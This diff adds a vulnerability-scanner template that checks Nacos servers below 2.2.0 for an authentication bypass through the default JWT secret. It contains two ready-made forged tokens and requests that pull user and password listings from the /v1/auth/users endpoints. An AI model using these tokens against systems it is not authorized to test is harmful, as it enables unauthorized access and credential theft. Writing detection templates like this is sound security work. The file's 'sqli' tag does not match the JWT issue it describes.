@@ -1,0 +1,41 @@
+id: nacos-authentication-bypass
+
+info:
+  name: Nacos < 2.2.0 - Authentication Bypass
+  author: Esonhugh
+  severity: critical
+  verified: true
+  description: |-
+    The authentication function of Nacos is can be bypass through default JWT secret.
+  reference:
+    - https://github.com/alibaba/nacos/issues/10060
+    - https://avd.aliyun.com/detail?id=AVD-2023-1655789
+    - https://nacos.io/zh-cn/docs/auth.html
+  tags: nacos,sqli
+  created: 2025/03/27
+
+set:
+  token: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g
+  token2: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcxMDUwNDAxOX0.vW8mpBNoJ7hVKPNhEtQl4Z5b00G4P9Ktrn_7c58crOk
+rules:
+  r0:
+    request:
+      method: GET
+      path: /nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token}}
+    expression: response.status == 200 && response.body.bcontains(b'"username":') && response.body.bcontains(b'"password":') && response.headers["content-type"].contains('application/json')
+  r1:
+    request:
+      method: GET
+      path: /v1/auth/users?pageNo=1&pageSize=10&accessToken={{token}}
+    expression: response.status == 200 && response.body.bcontains(b'"username":') && response.body.bcontains(b'"password":') && response.headers["content-type"].contains('application/json')
+  r2:
+    request:
+      method: GET
+      path: /nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token2}}
+    expression: response.status == 200 && response.body.bcontains(b'"username":') && response.body.bcontains(b'"password":') && response.headers["content-type"].contains('application/json')
+  r3:
+    request:
+      method: GET
+      path: /v1/auth/users?pageNo=1&pageSize=10&accessToken={{token2}}
+    expression: response.status == 200 && response.body.bcontains(b'"username":') && response.body.bcontains(b'"password":') && response.headers["content-type"].contains('application/json')
+expression: r0() || r1() || r2() || r3()
